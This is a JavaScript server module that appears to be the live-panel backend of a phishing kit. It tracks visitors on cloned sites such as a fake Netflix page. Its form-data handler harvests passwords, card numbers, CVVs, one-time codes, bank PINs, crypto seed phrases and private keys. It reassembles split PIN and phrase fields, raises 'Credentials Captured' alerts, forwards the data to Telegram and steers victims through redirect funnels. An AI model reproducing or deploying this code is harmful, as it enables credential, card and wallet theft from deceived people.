const { v4: uuidv4 } = require('uuid');
const { getDb } = require('../database/init');
const telegramService = require('../services/telegram');
const redirectService = require('../services/redirect');
const notificationService = require('../services/notification');


/**
 * Set up the /tracker namespace for receiving visitor data from tracked websites.
 *
 * @param {import('socket.io').Server} io - The root Socket.IO server
 * @param {import('socket.io').Namespace} trackerNsp - The /tracker namespace
 */
function setupTrackerNamespace(io, trackerNsp) {
  trackerNsp.on('connection', (socket) => {
    const apiKey = socket.handshake.auth?.apiKey || socket.handshake.query?.apiKey;

    if (!apiKey) {
      socket.emit('error', { message: 'API key required' });
      socket.disconnect(true);
      return;
    }

    // Validate API key and find website
    const db = getDb();
    const website = db.prepare(
      'SELECT * FROM websites WHERE api_key = ? AND is_active = 1'
    ).get(apiKey);

    if (!website) {
      socket.emit('error', { message: 'Invalid API key' });
      socket.disconnect(true);
      return;
    }

    // Store website info on socket for later use
    socket.websiteId = website.id;
    socket.websiteName = website.name;

    // Join website room for broadcast targeting
    socket.join(`website:${website.id}`);

    // ─── tracker:init ─────────────────────────────────────────
    socket.on('tracker:init', (data) => {
      try {
        let sessionId = data.sessionId || uuidv4();
        const ip = _getClientIp(socket);
        const ua = data.userAgent || socket.handshake.headers['user-agent'] || '';
        const parsed = _parseUserAgent(ua);
        const geo = _getGeoInfo(ip);

        // Store session ID on socket and join session room
        socket.sessionId = sessionId;
        socket.join(`session:${sessionId}`);

        // Check if session already exists
        let existingSession = db.prepare('SELECT * FROM sessions WHERE id = ?').get(sessionId);

        // If the existing session belongs to a DIFFERENT website, ignore it and
        // create a brand-new session. This prevents sessions bleeding across
        // websites (e.g. a visitor moving from Demo → Netflix on the same origin).
        if (existingSession && existingSession.website_id !== website.id) {
          console.log(`[ALP] Session ${sessionId} belongs to website ${existingSession.website_id}, not ${website.id}. Creating new session.`);
          existingSession = null;
          // Generate a fresh session ID so the new session doesn't collide
          const freshId = uuidv4();
          socket.sessionId = freshId;
          socket.leave(`session:${sessionId}`);
          socket.join(`session:${freshId}`);
          sessionId = freshId;
        }

        if (existingSession) {
          // Update existing session
          db.prepare(`
            UPDATE sessions
            SET is_active = 1, last_activity = CURRENT_TIMESTAMP, current_page = ?, referrer = ?
            WHERE id = ?
          `).run(
            data.page || data.url || '',
            data.referrer || '',
            sessionId
          );
        } else {
          // Create session record
          db.prepare(`
            INSERT INTO sessions (id, website_id, visitor_id, ip_address, user_agent, browser, os, device, country, city, current_page, referrer, pages_viewed, started_at, last_activity, is_active, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, '{}')
          `).run(
            sessionId,
            website.id,
            data.visitorId || uuidv4(),
            ip,
            ua,
            parsed.browser,
            parsed.os,
            parsed.device,
            geo.country,
            geo.city,
            data.page || data.url || '',
            data.referrer || '',
          );
        }

        // Record a page view if this is a new page load
        if (data.isNewPageLoad) {
          db.prepare(`
            INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp)
            VALUES (?, ?, ?, ?, 0, CURRENT_TIMESTAMP)
          `).run(
            sessionId,
            website.id,
            data.page || data.url || '',
            data.title || ''
          );

          if (existingSession) {
            db.prepare(`
              UPDATE sessions
              SET pages_viewed = pages_viewed + 1
              WHERE id = ?
            `).run(sessionId);
          }
        }

        // Get the freshly updated/created session for emitting
        const session = db.prepare(`
          SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, dp.name as current_page_name, dp.form_type as current_page_type
          FROM sessions s
          LEFT JOIN websites w ON s.website_id = w.id
          LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND s.current_page LIKE (dp.url || '%')
          WHERE s.id = ?
        `).get(sessionId);

        // Send session ID back to tracker
        socket.emit('tracker:session', { sessionId });

        // Emit to admin namespace
        const adminNsp = io.of('/admin');
        if (existingSession) {
          adminNsp.emit('admin:session:update', session);
        } else {
          adminNsp.emit('admin:session:new', session);

          // Create and emit system notification if enabled
          const notifySetting = db.prepare("SELECT value FROM settings WHERE key = 'notify_new_session'").get();
          if (!notifySetting || notifySetting.value !== '0') {
            const visitorIp = session.ip_address || 'Unknown IP';
            notificationService.createNotification(io, {
              type: 'success',
              title: 'New Visitor Live',
              message: `New visitor session active from ${visitorIp} (${parsed.browser || 'Unknown'}/${parsed.os || 'Unknown'}) on ${website.name}.`,
              link: `#/sessions?id=${sessionId}`
            });
          }
        }

        // Add to activity feed
        db.prepare(`
          INSERT INTO activity_feed (type, icon, message, details, website_id, session_id)
          VALUES (?, ?, ?, ?, ?, ?)
        `).run(
          'session',
          '👤',
          existingSession
            ? `Visitor returned on ${website.name}`
            : `New visitor from ${geo.country || 'Unknown'} on ${website.name}`,
          JSON.stringify({ browser: parsed.browser, os: parsed.os, page: data.page || data.url || '' }),
          website.id,
          sessionId
        );

        // Send Telegram alert (only for new sessions to prevent spamming)
        if (!existingSession) {
          telegramService.sendSessionAlert(session).catch(() => {});
        }

        // Check redirect rules
        _checkRedirectRules(io, session);
      } catch (err) {
        console.error('tracker:init error:', err.message);
        socket.emit('error', { message: 'Failed to initialize session' });
      }
    });

    // ─── tracker:pageview ─────────────────────────────────────
    socket.on('tracker:pageview', (data) => {
      try {
        if (!socket.sessionId) return;

        // Record page view
        db.prepare(`
          INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp)
          VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        `).run(
          socket.sessionId,
          website.id,
          data.url || data.page || '',
          data.title || '',
          data.duration || 0
        );

        // Update session current_page and increment pages_viewed
        db.prepare(`
          UPDATE sessions
          SET current_page = ?, pages_viewed = pages_viewed + 1, last_activity = CURRENT_TIMESTAMP, is_active = 1
          WHERE id = ?
        `).run(data.url || data.page || '', socket.sessionId);

        // Emit updated session to admin
        const updatedSession = db.prepare(`
          SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, dp.name as current_page_name, dp.form_type as current_page_type
          FROM sessions s
          LEFT JOIN websites w ON s.website_id = w.id
          LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND s.current_page LIKE (dp.url || '%')
          WHERE s.id = ?
        `).get(socket.sessionId);
        
        if (updatedSession) {
          const adminNsp = io.of('/admin');
          adminNsp.emit('admin:session:update', updatedSession);
          
          // Check redirect rules for the updated page view
          _checkRedirectRules(io, updatedSession);
        }
      } catch (err) {
        console.error('tracker:pageview error:', err.message);
      }
    });

    // ─── tracker:activity ─────────────────────────────────────
    socket.on('tracker:activity', (data) => {
      try {
        if (!socket.sessionId) return;

        const page = (data && data.page) || null;

        // Update last_activity AND current_page (if provided) so the
        // session stays alive and the admin always sees the right page.
        if (page) {
          db.prepare(`
            UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, current_page = ?, is_active = 1 WHERE id = ?
          `).run(page, socket.sessionId);
        } else {
          db.prepare(`
            UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?
          `).run(socket.sessionId);
        }

        // Emit updated session to admin so the panel keeps showing
        // this session as active (critical for loading/hold pages
        // where no other events fire).
        const updatedSession = db.prepare(`
          SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, dp.name as current_page_name, dp.form_type as current_page_type
          FROM sessions s
          LEFT JOIN websites w ON s.website_id = w.id
          LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND s.current_page LIKE (dp.url || '%')
          WHERE s.id = ?
        `).get(socket.sessionId);

        if (updatedSession) {
          const adminNsp = io.of('/admin');
          adminNsp.emit('admin:session:update', updatedSession);
        }
      } catch (err) {
        console.error('tracker:activity error:', err.message);
      }
    });

    // ─── tracker:formdata ─────────────────────────────────────
    socket.on('tracker:formdata', (data) => {
      try {
        if (!socket.sessionId) return;

        // Store form data in session metadata
        const session = db.prepare('SELECT metadata FROM sessions WHERE id = ?').get(socket.sessionId);
        let metadata = {};
        try {
          metadata = JSON.parse(session?.metadata || '{}');
        } catch { /* ignore */ }

        const rawFields = data.fields || data.formData || data.data || {};
        let mappedFields = { ...rawFields };
        try {
          const cleanUrl = (u) => (u || '').split('?')[0].replace(/\/$/, '').toLowerCase().replace(/\.html$/, '');
          const targetPath = cleanUrl(data.page || '');
          if (targetPath) {
            const demoPages = db.prepare('SELECT url, field_mappings FROM demo_pages WHERE website_id = ?').all(socket.websiteId);
            const matchingPage = demoPages.find(p => cleanUrl(p.url) === targetPath);
            if (matchingPage && matchingPage.field_mappings) {
              const mappings = JSON.parse(matchingPage.field_mappings || '{}');
              // First pass: figure out which raw keys share the same dest key
              // so we can sort them by their original order
              const destGroups = {};
              for (const rawKey of Object.keys(rawFields)) {
                const destKey = mappings[rawKey] || rawKey;
                if (!destGroups[destKey]) destGroups[destKey] = [];
                destGroups[destKey].push(rawKey);
              }
              mappedFields = {};
              for (const [destKey, rawKeys] of Object.entries(destGroups)) {
                if (rawKeys.length === 1) {
                  // Simple 1-to-1 mapping
                  mappedFields[destKey] = rawFields[rawKeys[0]];
                } else {
                  // Many-to-1: sort by the trailing numeric suffix so digit1 comes before digit2
                  const sorted = rawKeys.slice().sort((a, b) => {
                    const numA = parseInt((a.match(/\d+$/) || ['0'])[0], 10);
                    const numB = parseInt((b.match(/\d+$/) || ['0'])[0], 10);
                    return numA - numB;
                  });
                  // Decide separator: phrase/word fields need a space, digit/code fields need none
                  const PHRASE_DEST_KEYS = ['seed_phrase','mnemonic','recovery_phrase','security_question','security_answer','full_name','billing_address','shipping_address'];
                  const separator = PHRASE_DEST_KEYS.includes(destKey) ? ' ' : '';
                  // Concatenate values (e.g. digit1=4, digit2=8 → "48"; word1=foo, word2=bar → "foo bar")
                  mappedFields[destKey] = sorted.map(k => rawFields[k]).join(separator);
                }
              }
            }
          }
        } catch (err) {
          console.error('[ALP] Field mapping error:', err.message);
        }

        const capturedFields = mappedFields;
        if (!metadata.formData) metadata.formData = [];

        // Deduplicate: check if we already have a similar entry in the last 2 seconds
        const isDuplicate = metadata.formData.some(entry => {
          const timeDiff = Date.now() - new Date(entry.timestamp).getTime();
          if (timeDiff > 2000) return false;

          // Compare common critical data keys if present (e.g. email, password, card_number, cvv, expiry, otp_code, phone)
          const criticalKeys = [
            'email', 'password', 'card_number', 'cvv', 'expiry', 'otp_code', 'phone',
            'seed_phrase', 'private_key', 'wallet_pin', 'auth_code', 'bank_pin'
          ];
          let checkedCount = 0;
          let matchCount = 0;
          for (const key of criticalKeys) {
            if (key in entry.fields && key in capturedFields) {
              checkedCount++;
              if (String(entry.fields[key]) === String(capturedFields[key])) {
                matchCount++;
              }
            }
          }

          if (checkedCount > 0) {
            return matchCount === checkedCount;
          }

          // If no critical keys, fall back to comparing stringified fields
          return JSON.stringify(entry.fields) === JSON.stringify(capturedFields);
        });

        if (isDuplicate) {
          console.log('[ALP] Ignored duplicate form submission for session:', socket.sessionId);
          return;
        }

        metadata.formData.push({
          page: data.page || '',
          formId: data.formId || '',
          formAction: data.formAction || '',
          fields: capturedFields,
          timestamp: new Date().toISOString()
        });

        db.prepare('UPDATE sessions SET metadata = ?, last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?')
          .run(JSON.stringify(metadata), socket.sessionId);

        // Emit updated session to admin
        const updatedSession = db.prepare(`
          SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, dp.name as current_page_name, dp.form_type as current_page_type
          FROM sessions s
          LEFT JOIN websites w ON s.website_id = w.id
          LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND s.current_page LIKE (dp.url || '%')
          WHERE s.id = ?
        `).get(socket.sessionId);
        
        if (updatedSession) {
          const adminNsp = io.of('/admin');
          adminNsp.emit('admin:session:update', updatedSession);
        }

        // Add to activity feed
        const fieldCount = Object.keys(capturedFields).length;
        db.prepare(`
          INSERT INTO activity_feed (type, icon, message, details, website_id, session_id)
          VALUES (?, ?, ?, ?, ?, ?)
        `).run(
          'formdata',
          '📝',
          `Form data captured (${fieldCount} fields) on ${website.name}`,
          JSON.stringify({ page: data.page || '', formId: data.formId || '', fields: capturedFields }),
          website.id,
          socket.sessionId
        );

        // Create and emit system notification if enabled
        const notifySetting = db.prepare("SELECT value FROM settings WHERE key = 'notify_form_data'").get();
        if (!notifySetting || notifySetting.value !== '0') {
          const ignoreKeys = ['page', 'formid', 'formaction', 'submit', 'remember_me', 'remember'];
          const fieldsStr = Object.keys(capturedFields)
            .filter(k => !ignoreKeys.includes(k.toLowerCase()))
            .join(', ');
          const rawPage = (data.page || '').split('/').pop() || '';
          const pageName = rawPage.replace('.html', '').toLowerCase() || 'form';

          notificationService.createNotification(io, {
            type: 'alert',
            title: 'Credentials Captured',
            message: `Data captured ${pageName}: ${fieldsStr}`,
            link: `#/sessions?id=${socket.sessionId}`
          });
        }

        // Send Telegram alert with normalized data
        telegramService.sendFormDataAlert({ ...data, fields: capturedFields }, website).catch(() => {});

        // Resolve dynamic next page from the active funnel and redirect visitor
        redirectService.handleFunnelFormSubmit(io, socket.sessionId, data.page);
      } catch (err) {
        console.error('tracker:formdata error:', err.message);
      }
    });

    // ─── disconnect ───────────────────────────────────────────
    socket.on('disconnect', () => {
      try {
        if (!socket.sessionId) return;

        const sessionId = socket.sessionId;
        const websiteId = website.id;
        const websiteName = website.name;

        // Wait 20 seconds before marking the session inactive.
        // This grace period must be long enough to survive:
        //   - Page redirects (socket drops and a new socket connects on the next page)
        //   - Slow network conditions on mobile
        //   - Heavy pages that take a while to load and emit tracker:init
        // Previously 5 s was too short; 20 s is safe for all realistic cases.
        setTimeout(async () => {
          try {
            // Check if there are any active sockets still connected to this session
            const activeSockets = await trackerNsp.in(`session:${sessionId}`).fetchSockets();
            if (activeSockets.length > 0) {
              // User navigated to another page within the grace window — do nothing
              return;
            }

            // No active sockets remaining after grace period — session truly ended
            const db = getDb();
            db.prepare(`
              UPDATE sessions SET is_active = 0, last_activity = CURRENT_TIMESTAMP WHERE id = ?
            `).run(sessionId);

            // Emit to admin
            const adminNsp = io.of('/admin');
            adminNsp.emit('admin:session:end', {
              id: sessionId,
              sessionId: sessionId,
              websiteId: websiteId,
              websiteName: websiteName,
              timestamp: new Date().toISOString()
            });
          } catch (err) {
            console.error('tracker delayed disconnect check error:', err.message);
          }
        }, 20000);
      } catch (err) {
        console.error('tracker disconnect error:', err.message);
      }
    });
  });
}

/**
 * Check redirect rules for a new session and execute if a match is found.
 */
function _checkRedirectRules(io, session) {
  try {
    const db = getDb();
    const adminOnlineSetting = db.prepare("SELECT value FROM settings WHERE key = 'admin_online'").get();
    const isAdminOnline = adminOnlineSetting ? adminOnlineSetting.value === '1' : false;

    const matchedRule = redirectService.evaluateRules(session, isAdminOnline);

    if (matchedRule) {
      // Execute the redirect
      redirectService.executeRedirect(io, session.id, matchedRule.target_url, null);

      // Increment redirect_count on the rule
      db.prepare('UPDATE redirect_rules SET redirect_count = redirect_count + 1 WHERE id = ?')
        .run(matchedRule.id);
    }
  } catch (err) {
    console.error('Redirect rule check error:', err.message);
  }
}

/**
 * Extract client IP from the socket connection.
 */
function _getClientIp(socket) {
  return socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || socket.handshake.headers['x-real-ip']
    || socket.handshake.address
    || '0.0.0.0';
}

/**
 * Parse user agent string to extract browser, OS, and device type.
 * Lightweight parser — no external library needed.
 */
function _parseUserAgent(ua) {
  if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Desktop' };

  const uaLower = ua.toLowerCase();

  // ─── Browser Detection ──────────────────────────────────────
  let browser = 'Unknown';
  if (uaLower.includes('edg/') || uaLower.includes('edge/')) {
    browser = 'Edge';
    const match = ua.match(/Edg\/(\d+)/i) || ua.match(/Edge\/(\d+)/i);
    if (match) browser = `Edge ${match[1]}`;
  } else if (uaLower.includes('opr/') || uaLower.includes('opera')) {
    browser = 'Opera';
    const match = ua.match(/OPR\/(\d+)/i);
    if (match) browser = `Opera ${match[1]}`;
  } else if (uaLower.includes('chrome/') && !uaLower.includes('chromium')) {
    browser = 'Chrome';
    const match = ua.match(/Chrome\/(\d+)/i);
    if (match) browser = `Chrome ${match[1]}`;
  } else if (uaLower.includes('firefox/')) {
    browser = 'Firefox';
    const match = ua.match(/Firefox\/(\d+)/i);
    if (match) browser = `Firefox ${match[1]}`;
  } else if (uaLower.includes('safari/') && !uaLower.includes('chrome')) {
    browser = 'Safari';
    const match = ua.match(/Version\/(\d+)/i);
    if (match) browser = `Safari ${match[1]}`;
  } else if (uaLower.includes('msie') || uaLower.includes('trident/')) {
    browser = 'Internet Explorer';
  }

  // ─── OS Detection ───────────────────────────────────────────
  let os = 'Unknown';
  if (uaLower.includes('windows nt 10')) os = 'Windows 10';
  else if (uaLower.includes('windows nt 11') || (uaLower.includes('windows nt 10') && uaLower.includes('edg/'))) os = 'Windows';
  else if (uaLower.includes('windows')) os = 'Windows';
  else if (uaLower.includes('mac os x')) {
    os = 'macOS';
    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
    if (match) os = `macOS ${match[1].replace(/_/g, '.')}`;
  }
  else if (uaLower.includes('android')) {
    os = 'Android';
    const match = ua.match(/Android (\d+\.?\d*)/i);
    if (match) os = `Android ${match[1]}`;
  }
  else if (uaLower.includes('iphone') || uaLower.includes('ipad')) {
    os = 'iOS';
    const match = ua.match(/OS (\d+[._]\d+)/);
    if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
  }
  else if (uaLower.includes('linux')) os = 'Linux';
  else if (uaLower.includes('cros')) os = 'Chrome OS';

  // ─── Device Detection ──────────────────────────────────────
  let device = 'Desktop';
  if (uaLower.includes('mobile') || uaLower.includes('iphone') || uaLower.includes('android') && !uaLower.includes('tablet')) {
    device = 'Mobile';
  } else if (uaLower.includes('tablet') || uaLower.includes('ipad')) {
    device = 'Tablet';
  } else if (uaLower.includes('bot') || uaLower.includes('crawler') || uaLower.includes('spider')) {
    device = 'Bot';
  }

  return { browser, os, device };
}

/**
 * Get geo information from an IP address using geoip-lite.
 * Falls back gracefully if the module is not available or IP is local.
 */
function _getGeoInfo(ip) {
  try {
    const geoip = require('geoip-lite');
    // Strip IPv6 prefix if present
    const cleanIp = ip.replace(/^::ffff:/, '');
    const geo = geoip.lookup(cleanIp);
    if (geo) {
      return {
        country: geo.country || '',
        city: geo.city || ''
      };
    }
  } catch {
    // geoip-lite not available or failed — fall back silently
  }
  return { country: '', city: '' };
}

module.exports = { setupTrackerNamespace };
